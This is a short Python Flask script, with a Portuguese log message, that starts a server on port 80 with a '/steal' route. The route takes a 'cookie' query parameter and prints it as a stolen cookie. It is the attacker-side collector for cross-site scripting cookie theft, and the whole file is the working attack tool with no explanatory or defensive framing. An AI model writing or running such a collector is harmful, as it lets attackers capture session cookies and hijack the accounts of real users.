from flask import Flask, request
app = Flask(__name__)

@app.route('/steal')
def steal():
    cookie = request.args.get('cookie')
    print(f"Cookie roubado: {cookie}")
    return "OK"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=80)
